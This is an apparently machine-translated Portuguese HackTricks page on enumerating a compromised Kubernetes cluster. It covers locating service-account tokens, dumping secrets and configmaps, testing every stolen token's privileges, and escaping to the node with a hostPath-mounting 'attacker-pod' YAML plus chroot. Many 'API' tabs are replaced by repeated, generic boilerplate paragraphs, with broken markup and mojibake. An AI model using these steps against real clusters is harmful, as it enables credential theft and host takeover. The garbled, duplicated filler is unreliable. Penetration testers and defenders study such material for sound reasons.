# Enumera√ß√£o do Kubernetes

{% hint style="success" %}
Aprenda e pratique Hacking na AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Tokens do Kubernetes

Se voc√™ obteve acesso comprometido a uma m√°quina, o usu√°rio pode ter acesso a alguma plataforma Kubernetes. O token geralmente est√° localizado em um arquivo apontado pela **vari√°vel de ambiente `KUBECONFIG`** ou **dentro de `~/.kube`**.

Nesta pasta, voc√™ pode encontrar arquivos de configura√ß√£o com **tokens e configura√ß√µes para se conectar ao servidor da API**. Nesta pasta, voc√™ tamb√©m pode encontrar uma pasta de cache com informa√ß√µes previamente recuperadas.

Se voc√™ comprometeu um pod dentro de um ambiente Kubernetes, existem outros lugares onde voc√™ pode encontrar tokens e informa√ß√µes sobre o ambiente K8 atual:

### Tokens da Conta de Servi√ßo

Antes de continuar, se voc√™ n√£o sabe o que √© um servi√ßo no Kubernetes, sugiro que **siga este link e leia pelo menos as informa√ß√µes sobre a arquitetura do Kubernetes**.

Retirado da [documenta√ß√£o](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) do Kubernetes:

_"Quando voc√™ cria um pod e n√£o especifica uma conta de servi√ßo, ela √© automaticamente atribu√≠da √†_ conta de servi√ßo padr√£o _no mesmo namespace."_

**ServiceAccount** √© um objeto gerenciado pelo Kubernetes e usado para fornecer uma identidade para processos que s√£o executados em um pod.\
Cada conta de servi√ßo tem um segredo relacionado a ela e este segredo cont√©m um token de portador. Este √© um JSON Web Token (JWT), um m√©todo para representar reivindica√ß√µes de forma segura entre duas partes.

Geralmente **um** dos diret√≥rios:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

cont√™m os arquivos:

* **ca.crt**: √â o certificado ca para verificar as comunica√ß√µes do Kubernetes
* **namespace**: Indica o namespace atual
* **token**: Cont√©m o **token de servi√ßo** do pod atual.

Agora que voc√™ tem o token, voc√™ pode encontrar o servidor da API dentro da vari√°vel de ambiente **`KUBECONFIG`**. Para mais informa√ß√µes, execute `(env | set) | grep -i "kuber|kube`**`"`**

O token da conta de servi√ßo est√° sendo assinado pela chave que reside no arquivo **sa.key** e validado por **sa.pub**.

Localiza√ß√£o padr√£o no **Kubernetes**:

* /etc/kubernetes/pki

Localiza√ß√£o padr√£o no **Minikube**:

* /var/lib/localkube/certs

### Pods Ativos

_**Pods ativos s√£o**_ pods contendo um token de conta de servi√ßo privilegiado. Um token de conta de servi√ßo privilegiado √© um token que tem permiss√£o para realizar tarefas privilegiadas, como listar segredos, criar pods, etc.

## RBAC

Se voc√™ n√£o sabe o que √© **RBAC**, **leia esta se√ß√£o**.

## CheatSheet de Enumera√ß√£o

Para enumerar um ambiente K8s, voc√™ precisa de algumas coisas:

* Um **token de autentica√ß√£o v√°lido**. Na se√ß√£o anterior, vimos onde procurar por um token de usu√°rio e por um token de conta de servi√ßo.
* O **endere√ßo (**_**https://host:porta**_**) da API do Kubernetes**. Isso geralmente pode ser encontrado nas vari√°veis de ambiente e/ou no arquivo de configura√ß√£o kube.
* **Opcional**: O **ca.crt para verificar o servidor da API**. Isso pode ser encontrado nos mesmos lugares onde o token pode ser encontrado. Isso √© √∫til para verificar o certificado do servidor da API, mas usando `--insecure-skip-tls-verify` com `kubectl` ou `-k` com `curl`, voc√™ n√£o precisar√° disso.

Com esses detalhes, voc√™ pode **enumerar o Kubernetes**. Se a **API** por algum motivo estiver **acess√≠vel** pela **Internet**, voc√™ pode simplesmente baixar essas informa√ß√µes e enumerar a plataforma a partir do seu host.

No entanto, geralmente o **servidor da API est√° dentro de uma rede interna**, portanto voc√™ precisar√° **criar um t√∫nel** atrav√©s da m√°quina comprometida para acess√°-lo a partir da sua m√°quina, ou voc√™ pode **fazer upload do** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) bin√°rio, ou usar **`curl/wget/qualquer coisa`** para realizar solicita√ß√µes HTTP brutas para o servidor da API.

### Diferen√ßas entre os verbos `list` e `get`

Com permiss√µes de **`get`**, voc√™ pode acessar informa√ß√µes de ativos espec√≠ficos (_op√ß√£o `describe` no `kubectl`_) da API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Se voc√™ tiver permiss√£o **`list`**, voc√™ est√° autorizado a executar solicita√ß√µes de API para listar um tipo de recurso (_op√ß√£o `_`get`_` no `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Se voc√™ tiver permiss√£o **`watch`**, voc√™ est√° autorizado a executar solicita√ß√µes de API para monitorar ativos:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Eles abrem uma conex√£o de streaming que retorna o manifesto completo de um Deployment sempre que ele muda (ou quando um novo √© criado).

{% hint style="danger" %}
Os seguintes comandos `kubectl` indicam apenas como listar os objetos. Se voc√™ deseja acessar os dados, precisa usar `describe` em vez de `get`
{% endhint %}

### Usando curl

De dentro de um pod, voc√™ pode usar v√°rias vari√°veis de ambiente:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Por padr√£o, o pod pode **acessar** o **servidor kube-api** no nome de dom√≠nio **`kubernetes.default.svc`** e voc√™ pode ver a rede kube em **`/etc/resolv.config`** onde encontrar√° o endere√ßo do servidor DNS do Kubernetes (o ".1" da mesma faixa √© o endpoint kube-api).
{% endhint %}

### Usando kubectl

Tendo o token e o endere√ßo do servidor de API, voc√™ pode usar kubectl ou curl para acess√°-lo conforme indicado aqui:

Por padr√£o, o APISERVER est√° se comunicando com o esquema `https://`.
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> se n√£o houver `https://` na url, voc√™ pode receber um Erro Como Solicita√ß√£o Inv√°lida.

Voc√™ pode encontrar uma [**folha de dicas oficial do kubectl aqui**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). O objetivo das se√ß√µes a seguir √© apresentar de maneira ordenada diferentes op√ß√µes para enumerar e entender o novo K8s ao qual voc√™ obteve acesso.

Para encontrar a solicita√ß√£o HTTP que o `kubectl` envia, voc√™ pode usar o par√¢metro `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Configura√ß√£o Atual

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Se voc√™ conseguiu roubar algumas credenciais de usu√°rios, voc√™ pode **configur√°-las localmente** usando algo como:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Obter Recursos Suportados

Com essa informa√ß√£o, voc√™ saber√° todos os servi√ßos que pode listar

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Obter Privil√©gios Atuais

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

## Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, √© importante identificar recursos expostos que podem ser alvos de ataques. Alguns pontos de verifica√ß√£o incluem:

- **Servi√ßos Expostos**: Identificar servi√ßos expostos na Internet que podem conter vulnerabilidades.
- **API Server**: Verificar se o servidor da API do Kubernetes est√° configurado corretamente para evitar vazamentos de informa√ß√µes sens√≠veis.
- **Dashboard**: Investigar se o painel do Kubernetes est√° acess√≠vel e protegido adequadamente.
- **Workloads**: Identificar os workloads em execu√ß√£o no cluster, como pods e deployments.
- **Permiss√µes**: Verificar as permiss√µes atribu√≠das aos diferentes componentes do cluster para evitar poss√≠veis viola√ß√µes de seguran√ßa.

Essas etapas ajudar√£o na identifica√ß√£o de poss√≠veis pontos fracos no cluster Kubernetes e na implementa√ß√£o de medidas corretivas para fortalecer a seguran√ßa. 

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Outra maneira de verificar seus privil√©gios √© usando a ferramenta: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Voc√™ pode aprender mais sobre **Kubernetes RBAC** em:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Depois de saber quais privil√©gios** voc√™ possui, verifique a seguinte p√°gina para descobrir **se voc√™ pode abusar deles** para escalar privil√©gios:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Obter Outros pap√©is

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

## Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, √© importante identificar recursos expostos que podem ser alvos de ataques. Alguns pontos de verifica√ß√£o incluem:

- **Servi√ßos Expostos**: Identificar servi√ßos expostos, como APIs, pain√©is de controle e aplica√ß√µes web.
- **Permiss√µes de RBAC**: Verificar as permiss√µes de Role-Based Access Control (RBAC) para identificar poss√≠veis brechas de seguran√ßa.
- **Configura√ß√µes de Rede**: Analisar as configura√ß√µes de rede para identificar poss√≠veis vulnerabilidades, como portas abertas desnecess√°rias.
- **Workloads**: Identificar os workloads em execu√ß√£o no cluster para entender melhor a arquitetura e poss√≠veis pontos de falha.
- **Segredos**: Procurar por segredos n√£o criptografados ou mal configurados que possam levar a comprometimentos de seguran√ßa.

Essas etapas ajudam a identificar poss√≠veis vulnerabilidades e a fortalecer a seguran√ßa do cluster Kubernetes. 

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
### Obter namespaces

O Kubernetes suporta **m√∫ltiplos clusters virtuais** suportados pelo mesmo cluster f√≠sico. Esses clusters virtuais s√£o chamados de **namespaces**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

## Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, √© importante identificar recursos expostos que podem ser alvos de ataques. Alguns pontos de verifica√ß√£o incluem:

- **Servi√ßos Expostos**: Identificar servi√ßos expostos na Internet que podem conter vulnerabilidades.
- **API Server**: Verificar se o servidor da API do Kubernetes est√° configurado corretamente para evitar vazamentos de informa√ß√µes sens√≠veis.
- **Dashboard**: Investigar se o painel do Kubernetes est√° acess√≠vel e protegido adequadamente.
- **Workloads**: Identificar os workloads em execu√ß√£o no cluster, como pods e deployments.
- **Permiss√µes**: Verificar as permiss√µes atribu√≠das aos diferentes componentes do cluster para evitar poss√≠veis viola√ß√µes de seguran√ßa.

Essas etapas ajudar√£o na identifica√ß√£o de poss√≠veis pontos fracos no cluster Kubernetes e na implementa√ß√£o de medidas corretivas para fortalecer a seguran√ßa. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Obter segredos

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, √© importante identificar recursos expostos que podem ser alvos de ataques. Alguns pontos de verifica√ß√£o incluem:

- **Servi√ßos Expostos**: Identificar servi√ßos expostos na Internet que podem ser acessados sem autentica√ß√£o.
- **API Server**: Verificar se o servidor da API do Kubernetes est√° configurado corretamente para evitar vazamentos de informa√ß√µes sens√≠veis.
- **Dashboard**: Investigar se o painel do Kubernetes est√° acess√≠vel e se est√° protegido adequadamente.
- **Workloads**: Identificar os workloads em execu√ß√£o no cluster, como pods, deployments e jobs.
- **Permiss√µes**: Verificar as permiss√µes atribu√≠das aos diferentes objetos no cluster para identificar poss√≠veis brechas de seguran√ßa.

Essas etapas ajudar√£o na identifica√ß√£o de poss√≠veis vulnerabilidades e na melhoria da seguran√ßa do cluster Kubernetes. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Se voc√™ pode ler segredos, voc√™ pode usar as seguintes linhas para obter os privil√©gios relacionados a cada token:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Obter Contas de Servi√ßo

Conforme discutido no in√≠cio desta p√°gina, quando um pod √© executado, geralmente √© atribu√≠da a ele uma conta de servi√ßo. Portanto, listar as contas de servi√ßo, suas permiss√µes e onde est√£o sendo executadas pode permitir que um usu√°rio aumente seus privil√©gios.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 

## Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, √© importante identificar os recursos expostos que podem ser alvos de ataques. Alguns m√©todos comuns para enumerar recursos incluem:

- Listar todos os namespaces
- Listar todos os pods em cada namespace
- Listar todos os servi√ßos em cada namespace
- Listar todos os deployments em cada namespace
- Listar todos os secrets em cada namespace

Essas etapas ajudam a mapear o ambiente Kubernetes e identificar poss√≠veis pontos de entrada para um atacante. 

Al√©m disso, √© importante verificar se h√° configura√ß√µes de seguran√ßa inadequadas, como permiss√µes excessivas ou credenciais expostas, que possam ser exploradas durante um teste de invas√£o. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Obter Implanta√ß√µes

As implanta√ß√µes especificam os **componentes** que precisam ser **executados**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, √© importante identificar e enumerar os recursos expostos que podem ser alvos de ataques. Alguns dos recursos que podem ser identificados durante a enumera√ß√£o incluem:

- **Pods**: Verifique os pods em execu√ß√£o no cluster, pois eles podem conter informa√ß√µes sens√≠veis ou serem usados como ponto de entrada para movimentos laterais.
- **Servi√ßos**: Identifique os servi√ßos dispon√≠veis no cluster, pois eles podem expor aplicativos e servi√ßos vulner√°veis.
- **Endpoints**: Enumere os endpoints para descobrir quais servi√ßos est√£o dispon√≠veis e podem ser explorados.
- **Permiss√µes RBAC**: Verifique as permiss√µes baseadas em fun√ß√µes (RBAC) para identificar poss√≠veis brechas de seguran√ßa que possam permitir acesso n√£o autorizado.
- **ConfigMaps e Secrets**: Enumere os ConfigMaps e Secrets para identificar informa√ß√µes sens√≠veis que possam ter sido configuradas incorretamente.

Essas etapas de enumera√ß√£o s√£o essenciais para entender a superf√≠cie de ataque do cluster Kubernetes e identificar poss√≠veis vulnerabilidades que precisam ser corrigidas. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### Obter Pods

Os Pods s√£o os **containers** reais que ser√£o **executados**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, √© importante identificar recursos expostos que podem ser alvos de ataques. Alguns pontos de verifica√ß√£o incluem:

- **Servi√ßos Expostos**: Identificar servi√ßos expostos na Internet que podem conter vulnerabilidades.
- **API Server**: Verificar se o servidor da API do Kubernetes est√° configurado corretamente para evitar vazamentos de informa√ß√µes sens√≠veis.
- **Dashboard**: Investigar se o painel do Kubernetes est√° acess√≠vel e protegido adequadamente.
- **Workloads**: Identificar os workloads em execu√ß√£o no cluster, como pods e deployments.
- **Permiss√µes**: Verificar as permiss√µes atribu√≠das aos diferentes componentes do cluster para evitar acessos n√£o autorizados.

Essas etapas ajudar√£o na identifica√ß√£o de poss√≠veis pontos fracos no cluster Kubernetes e na implementa√ß√£o de medidas corretivas para fortalecer a seguran√ßa. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Obter Servi√ßos

Os **servi√ßos** do Kubernetes s√£o usados para **expor um servi√ßo em uma porta e IP espec√≠ficos** (que atuar√° como balanceador de carga para os pods que est√£o realmente oferecendo o servi√ßo). Isso √© interessante para saber onde voc√™ pode encontrar outros servi√ßos para tentar atacar.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

## Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, √© importante identificar recursos expostos que podem ser alvos de ataques. Alguns pontos de verifica√ß√£o incluem:

- **Servi√ßos Expostos**: Identificar servi√ßos expostos na Internet que podem conter vulnerabilidades.
- **API Server**: Verificar se o servidor da API do Kubernetes est√° configurado corretamente para evitar vazamentos de informa√ß√µes sens√≠veis.
- **Dashboard**: Investigar se o painel do Kubernetes est√° acess√≠vel e protegido adequadamente.
- **Workloads**: Identificar os workloads em execu√ß√£o no cluster, como pods e deployments.
- **Permiss√µes**: Verificar as permiss√µes atribu√≠das aos diferentes componentes do cluster para evitar acessos n√£o autorizados.

Essas etapas ajudar√£o a identificar poss√≠veis pontos fracos no cluster Kubernetes e a fortalecer a seguran√ßa do ambiente. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Obter n√≥s

Obtenha todos os **n√≥s configurados dentro do cluster**. 

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

### Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, voc√™ pode usar v√°rias t√©cnicas para coletar informa√ß√µes importantes sobre o ambiente alvo. Algumas dessas t√©cnicas incluem:

- Verifica√ß√£o de servi√ßos e pods em execu√ß√£o
- Listagem de permiss√µes de servi√ßo
- Identifica√ß√£o de segredos e configura√ß√µes sens√≠veis
- Explora√ß√£o de vulnerabilidades conhecidas

Essas t√©cnicas podem ajudar a identificar poss√≠veis pontos fracos no cluster Kubernetes e aprimorar a postura de seguran√ßa geral do ambiente. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Obter DaemonSets

**DaemonSets** permitem garantir que um **pod espec√≠fico est√° em execu√ß√£o em todos os n√≥s** do cluster (ou nos selecionados). Se voc√™ excluir o DaemonSet, os pods gerenciados por ele tamb√©m ser√£o removidos.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 

## Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, √© importante identificar os recursos expostos que podem ser alvos de ataques. Alguns m√©todos comuns para enumerar recursos incluem:

- Listar todos os namespaces
- Listar todos os pods em cada namespace
- Listar todos os servi√ßos em cada namespace
- Listar todos os deployments em cada namespace
- Listar todos os secrets em cada namespace

Essas etapas ajudam a mapear o ambiente Kubernetes e identificar poss√≠veis pontos de entrada para um atacante. 

Al√©m disso, √© importante verificar se h√° configura√ß√µes de seguran√ßa inadequadas, como permiss√µes excessivas ou credenciais expostas, que possam ser exploradas durante um teste de invas√£o. 

Por fim, a enumera√ß√£o cuidadosa do cluster Kubernetes √© essencial para garantir a seguran√ßa e prote√ß√£o dos recursos hospedados na infraestrutura. 

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Obter cronjob

Os cron jobs permitem agendar, usando uma sintaxe semelhante ao crontab, o lan√ßamento de um pod que executar√° alguma a√ß√£o.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

## Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, √© importante identificar recursos expostos que podem ser alvos de ataques. Alguns pontos de verifica√ß√£o incluem:

- **Servi√ßos Expostos**: Identificar servi√ßos expostos na Internet que podem conter vulnerabilidades.
- **API Server**: Verificar se o servidor da API do Kubernetes est√° configurado corretamente para evitar poss√≠veis ataques.
- **Permiss√µes RBAC**: Analisar as permiss√µes do Role-Based Access Control (RBAC) para identificar poss√≠veis brechas de seguran√ßa.
- **Workloads**: Identificar os workloads em execu√ß√£o no cluster para entender melhor a arquitetura e poss√≠veis pontos fracos.
- **Segredos**: Procurar por segredos n√£o criptografados ou mal configurados que possam levar a viola√ß√µes de seguran√ßa.

Essas etapas ajudar√£o na identifica√ß√£o de poss√≠veis vulnerabilidades e na melhoria da seguran√ßa do cluster Kubernetes. 

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Obter configMap

configMap sempre cont√©m muitas informa√ß√µes e arquivos de configura√ß√£o que s√£o fornecidos para aplicativos que s√£o executados no Kubernetes. Geralmente, voc√™ pode encontrar muitas senhas, segredos, tokens que s√£o usados para se conectar e validar outros servi√ßos internos/externos.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

### Enumera√ß√£o de Kubernetes

Durante a enumera√ß√£o de um cluster Kubernetes, voc√™ pode usar v√°rias t√©cnicas para coletar informa√ß√µes importantes sobre o ambiente alvo. Algumas dessas t√©cnicas incluem:

- Identificar namespaces dispon√≠veis
- Listar pods em cada namespace
- Enumerar servi√ßos e endpoints
- Verificar permiss√µes de RBAC
- Analisar configmaps e secrets

Essas etapas ajudar√£o voc√™ a entender melhor a topologia do cluster Kubernetes e a identificar poss√≠veis pontos fracos que podem ser explorados durante um teste de invas√£o. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Obter "todos"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Obter Consumos de Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### Escapando do pod

Se voc√™ conseguir criar novos pods, talvez consiga escapar deles para o n√≥. Para fazer isso, voc√™ precisa criar um novo pod usando um arquivo yaml, mudar para o pod criado e depois chroot no sistema do n√≥. Voc√™ pode usar pods j√° existentes como refer√™ncia para o arquivo yaml, pois eles exibem imagens e caminhos existentes.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> se precisar criar um pod em um n√≥ espec√≠fico, voc√™ pode usar o seguinte comando para obter os r√≥tulos no n√≥
>
> `k get nodes --show-labels`
>
> Comumente, kubernetes.io/hostname e node-role.kubernetes.io/master s√£o bons r√≥tulos para sele√ß√£o.
>
> [refer√™ncia]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Em seguida, crie seu arquivo attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
Depois disso, voc√™ cria o pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Agora voc√™ pode alternar para o pod criado da seguinte forma:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
E finalmente voc√™ chroot no sistema do n√≥
```bash
chroot /root /bin/bash
```
Informa√ß√µes obtidas em: [Kubernetes Namespace Breakout usando Volume de Caminho de Host Inseguro - Parte 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Atacando e Defendendo o Kubernetes: Bust-A-Kube - Epis√≥dio 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Refer√™ncias

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Aprenda e pratique Hacking na AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos no** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
